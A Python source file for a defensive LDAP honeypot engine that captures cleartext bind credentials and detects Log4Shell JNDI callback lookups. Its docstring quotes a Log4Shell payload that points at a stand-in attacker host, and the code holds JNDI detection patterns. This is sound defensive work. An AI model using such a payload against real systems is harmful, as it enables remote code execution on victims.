"""LDAP honeypot engine — tcp/389, bind credentials and JNDI callbacks.

Two very different populations hit port 389, and both are worth catching.

**Directory attackers.** LDAP simple bind sends the DN and password in the
clear. A bind attempt is therefore a credential capture with the account's full
distinguished name attached, which is more useful than a bare username — it
tells you which directory the attacker believes exists
(`cn=admin,dc=corp,dc=local` names the domain they are targeting). Anonymous
binds and unauthenticated searches are how an exposed directory gets enumerated.

**Log4Shell (CVE-2021-44228) second stage.** The famous
`${jndi:ldap://attacker/a}` payload makes the *victim* connect out to an LDAP
server the attacker controls. Running this engine means that when someone
sprays that payload at your HTTP honeypot with your own address in it — or when
a real internal host is exploited and reaches this sensor — you capture the
second stage rather than only the initial probe. A JNDI lookup is recognisable:
a searchRequest for a short, opaque base DN with no directory structure, often
requesting the `javaClassName` / `javaCodeBase` attributes.

Implemented: BER parse of LDAPMessage for bindRequest, searchRequest,
unbindRequest and abandonRequest, plus well-formed bindResponse and
searchResDone replies. Not implemented: a real directory tree, SASL, or LDAPS.
The goal is to keep the client talking long enough to hand over what it wants,
not to be a directory server.

Wire format: RFC 4511 §4, ASN.1 BER.
"""

from __future__ import annotations

import asyncio
import logging
import re
import secrets
from typing import Any

from honeypot_mcp.config import get_settings
from honeypot_mcp.engines.base import HoneypotEngine
from honeypot_mcp.engines.conn_limit import ConnectionLimiter, limited_factory
from honeypot_mcp.storage import queries
from honeypot_mcp.storage.database import get_session
from honeypot_mcp.storage.event_buffer import PendingEvent, submit_event
from honeypot_mcp.storage.models import AlertSeverity

log = logging.getLogger(__name__)

_SEQUENCE = 0x30
_INTEGER = 0x02
_OCTET_STRING = 0x04
_ENUMERATED = 0x0A

# LDAP protocol operations (application-tagged).
_BIND_REQUEST = 0x60
_BIND_RESPONSE = 0x61
_UNBIND_REQUEST = 0x42
_SEARCH_REQUEST = 0x63
_SEARCH_RES_ENTRY = 0x64
_SEARCH_RES_DONE = 0x65
_ABANDON_REQUEST = 0x50
_EXTENDED_REQUEST = 0x77

_OP_NAMES = {
    _BIND_REQUEST: "bindRequest",
    _UNBIND_REQUEST: "unbindRequest",
    _SEARCH_REQUEST: "searchRequest",
    _ABANDON_REQUEST: "abandonRequest",
    _EXTENDED_REQUEST: "extendedRequest",
}

# Result codes (RFC 4511 §4.1.9).
_SUCCESS = 0
_INVALID_CREDENTIALS = 49

_MAX_MESSAGE_BYTES = 65536

# A JNDI lookup base DN is an opaque token, not a directory path: Log4Shell
# payloads end in something like `/a`, `/Basic/Command/Base64/...` or a random
# id, and the resulting searchRequest carries that as the base object with no
# `dc=`/`cn=`/`ou=` components at all.
_DIRECTORY_COMPONENT = re.compile(r"\b(dc|cn|ou|o|uid|sn|l|st|c)\s*=", re.I)
_JNDI_ATTRIBUTES = frozenset(
    {"javaclassname", "javacodebase", "javafactory", "javaserializeddata", "objectclass"}
)


def _decode_length(data: bytes, pos: int) -> tuple[int, int]:
    first = data[pos]
    pos += 1
    if first < 0x80:
        return first, pos
    count = first & 0x7F
    if count == 0 or count > 4 or pos + count > len(data):
        raise ValueError("bad BER length")
    return int.from_bytes(data[pos : pos + count], "big"), pos + count


def _decode_tlv(data: bytes, pos: int) -> tuple[int, bytes, int]:
    if pos >= len(data):
        raise ValueError("truncated BER")
    tag = data[pos]
    length, pos = _decode_length(data, pos + 1)
    if pos + length > len(data):
        raise ValueError("BER length exceeds buffer")
    return tag, data[pos : pos + length], pos + length


def _encode_length(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    body = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(body)]) + body


def _tlv(tag: int, value: bytes) -> bytes:
    return bytes([tag]) + _encode_length(len(value)) + value


def _encode_int(value: int, tag: int = _INTEGER) -> bytes:
    if value == 0:
        return _tlv(tag, b"\x00")
    length = (value.bit_length() + 8) // 8
    return _tlv(tag, value.to_bytes(length, "big", signed=True))


def parse_ldap_message(data: bytes) -> dict[str, Any] | None:
    """Parse one LDAPMessage. Returns None if it is not parseable LDAP."""
    try:
        tag, body, consumed = _decode_tlv(data, 0)
        if tag != _SEQUENCE:
            return None
        pos = 0
        t, raw_id, pos = _decode_tlv(body, pos)
        if t != _INTEGER:
            return None
        message_id = int.from_bytes(raw_id, "big") if raw_id else 0
        op_tag, op_body, _ = _decode_tlv(body, pos)

        result: dict[str, Any] = {
            "message_id": message_id,
            "op": op_tag,
            "op_name": _OP_NAMES.get(op_tag, f"0x{op_tag:02x}"),
            "consumed": consumed,
        }

        if op_tag == _BIND_REQUEST:
            inner = 0
            _t, raw_version, inner = _decode_tlv(op_body, inner)
            _t, raw_dn, inner = _decode_tlv(op_body, inner)
            result["version"] = int.from_bytes(raw_version, "big") if raw_version else 0
            result["bind_dn"] = raw_dn.decode("utf-8", errors="replace")
            # Simple authentication is context tag 0 — the password in the clear.
            auth_tag, auth_body, _ = _decode_tlv(op_body, inner)
            if auth_tag == 0x80:
                result["password"] = auth_body.decode("utf-8", errors="replace")
                result["auth"] = "simple"
            else:
                result["password"] = ""
                result["auth"] = "sasl"
        elif op_tag == _SEARCH_REQUEST:
            inner = 0
            _t, raw_base, inner = _decode_tlv(op_body, inner)
            result["base_dn"] = raw_base.decode("utf-8", errors="replace")
            attributes: list[str] = []
            # Walk the remaining fields; the attribute list is the final
            # SEQUENCE. Scanners send wildly varied filters, so rather than
            # decode the filter grammar we take the last sequence we find.
            last_seq: bytes | None = None
            while inner < len(op_body):
                try:
                    t, chunk, inner = _decode_tlv(op_body, inner)
                except ValueError:
                    break
                if t == _SEQUENCE:
                    last_seq = chunk
            if last_seq:
                apos = 0
                while apos < len(last_seq):
                    try:
                        t, raw_attr, apos = _decode_tlv(last_seq, apos)
                    except ValueError:
                        break
                    if t == _OCTET_STRING:
                        attributes.append(raw_attr.decode("utf-8", errors="replace"))
            result["attributes"] = attributes
        return result
    except (ValueError, IndexError):
        return None


def build_bind_response(message_id: int, result_code: int, message: str = "") -> bytes:
    body = (
        _encode_int(result_code, _ENUMERATED)
        + _tlv(_OCTET_STRING, b"")  # matchedDN
        + _tlv(_OCTET_STRING, message.encode())
    )
    return _tlv(_SEQUENCE, _encode_int(message_id) + _tlv(_BIND_RESPONSE, body))


def build_search_done(message_id: int, result_code: int = _SUCCESS) -> bytes:
    body = (
        _encode_int(result_code, _ENUMERATED) + _tlv(_OCTET_STRING, b"") + _tlv(_OCTET_STRING, b"")
    )
    return _tlv(_SEQUENCE, _encode_int(message_id) + _tlv(_SEARCH_RES_DONE, body))


def looks_like_jndi(base_dn: str, attributes: list[str]) -> bool:
    """True when a searchRequest looks like a Log4Shell JNDI lookup.

    Two independent signals, either of which is enough:

    * The base object has no directory components at all. A real client
      searches `dc=corp,dc=local`; a JNDI lookup asks for a bare token such as
      `a`, `Exploit` or a random id, because that segment is just the path from
      the payload URL.
    * The requested attributes are the Java serialisation set an exploit
      toolkit asks for.
    """
    if any(attr.lower() in _JNDI_ATTRIBUTES - {"objectclass"} for attr in attributes):
        return True
    stripped = base_dn.strip()
    return bool(stripped) and not _DIRECTORY_COMPONENT.search(stripped)


class _LDAPProtocol(asyncio.Protocol):
    def __init__(self, honeypot_name: str, hp_id: int | None) -> None:
        self._name = honeypot_name
        self._hp_id = hp_id
        self._transport: asyncio.Transport | None = None
        self._peer: tuple[str, int] = ("0.0.0.0", 0)
        self._buf = b""

    def connection_made(self, transport: asyncio.BaseTransport) -> None:
        assert isinstance(transport, asyncio.Transport)
        self._transport = transport
        self._peer = transport.get_extra_info("peername") or ("0.0.0.0", 0)
        asyncio.create_task(self._record("ldap_connection", AlertSeverity.LOW, {}))

    def data_received(self, data: bytes) -> None:
        self._buf += data
        if len(self._buf) > _MAX_MESSAGE_BYTES:
            self._close()
            return
        while self._buf:
            message = parse_ldap_message(self._buf)
            if message is None:
                # Either incomplete or garbage. Record garbage once and drop it.
                if len(self._buf) > 8 and self._buf[0] != _SEQUENCE:
                    asyncio.create_task(
                        self._record(
                            "ldap_invalid_probe",
                            AlertSeverity.LOW,
                            {"bytes": len(self._buf), "head_hex": self._buf[:32].hex()},
                        )
                    )
                    self._buf = b""
                return
            self._buf = self._buf[message["consumed"] :]
            self._dispatch(message)

    def _send(self, payload: bytes) -> None:
        if self._transport is not None and not self._transport.is_closing():
            self._transport.write(payload)

    def _close(self) -> None:
        if self._transport is not None:
            self._transport.close()

    def _dispatch(self, message: dict[str, Any]) -> None:
        op = message["op"]

        if op == _BIND_REQUEST:
            dn = message.get("bind_dn", "")
            password = message.get("password", "")
            if not dn and not password:
                # Anonymous bind. Real directories often permit it, and it is
                # the first step of unauthenticated enumeration — so accept it.
                self._send(build_bind_response(message["message_id"], _SUCCESS))
                asyncio.create_task(
                    self._record("ldap_anonymous_bind", AlertSeverity.MEDIUM, {"bind_dn": ""})
                )
                return
            # Reject with invalidCredentials, exactly as a real directory would
            # for a wrong password — this is what keeps a brute-forcer cycling
            # through its list instead of stopping at the first success.
            self._send(
                build_bind_response(
                    message["message_id"], _INVALID_CREDENTIALS, "80090308: LdapErr: DSID-0C090447"
                )
            )
            asyncio.create_task(
                self._record(
                    "ldap_bind_attempt",
                    AlertSeverity.HIGH,
                    {
                        "bind_dn": dn[:256],
                        "username": dn[:256],
                        "password": password[:256],
                        "service": "ldap",
                        "ldap_version": message.get("version"),
                        "auth": message.get("auth"),
                    },
                )
            )
            return

        if op == _SEARCH_REQUEST:
            base_dn = message.get("base_dn", "")
            attributes = message.get("attributes", [])
            if looks_like_jndi(base_dn, attributes):
                asyncio.create_task(
                    self._record(
                        "ldap_jndi_lookup",
                        AlertSeverity.CRITICAL,
                        {
                            "base_dn": base_dn[:256],
                            "attributes": attributes[:20],
                            "note": (
                                "JNDI-shaped lookup — Log4Shell (CVE-2021-44228) second "
                                "stage; the connecting host may be compromised"
                            ),
                        },
                    )
                )
            else:
                asyncio.create_task(
                    self._record(
                        "ldap_search",
                        AlertSeverity.MEDIUM,
                        {"base_dn": base_dn[:256], "attributes": attributes[:20]},
                    )
                )
            # No entries, clean done — the client gets a valid, empty result.
            self._send(build_search_done(message["message_id"]))
            return

        if op == _UNBIND_REQUEST:
            self._close()
            return

        if op == _EXTENDED_REQUEST:
            # StartTLS and friends. Decline so the client stays in the clear.
            self._send(build_bind_response(message["message_id"], 2, "unwilling to perform"))
            asyncio.create_task(
                self._record("ldap_extended_request", AlertSeverity.LOW, {"op": message["op_name"]})
            )
            return

        asyncio.create_task(
            self._record("ldap_command", AlertSeverity.LOW, {"op": message["op_name"]})
        )

    async def _record(self, event_type: str, severity: AlertSeverity, payload: dict) -> None:
        src_ip, src_port = self._peer
        await submit_event(
            PendingEvent(
                honeypot_id=self._hp_id,
                source_ip=src_ip,
                source_port=src_port,
                event_type=event_type,
                payload=payload,
                severity=severity,
            )
        )

    def connection_lost(self, exc: Exception | None) -> None:
        self._buf = b""


class LDAPEngine(HoneypotEngine):
    def __init__(self) -> None:
        self._servers: dict[str, asyncio.AbstractServer] = {}
        self._limiter = ConnectionLimiter(get_settings().max_connections_per_ip)

    async def start(self, name: str, port: int, config: dict[str, Any]) -> str:
        hp_id: int | None = None
        async with get_session() as session:
            hp = await queries.get_honeypot_by_name(session, name)
            if hp:
                hp_id = hp.id

        loop = asyncio.get_event_loop()
        server = await loop.create_server(
            limited_factory(lambda: _LDAPProtocol(name, hp_id), self._limiter),
            host="0.0.0.0",
            port=port,
        )
        cid = f"ldap-{secrets.token_hex(8)}"
        self._servers[cid] = server
        log.info("LDAP honeypot '%s' listening on port %d", name, port)
        return cid

    async def stop(self, container_id: str, remove: bool = False) -> None:
        server = self._servers.pop(container_id, None)
        if server:
            server.close()
            await server.wait_closed()

    async def status(self, container_id: str) -> dict[str, Any]:
        return {"running": container_id in self._servers, "type": "asyncio_ldap"}

    async def get_logs(self, container_id: str, lines: int = 50) -> list[str]:
        return ["LDAP honeypot is in-process — events are stored directly in the database."]
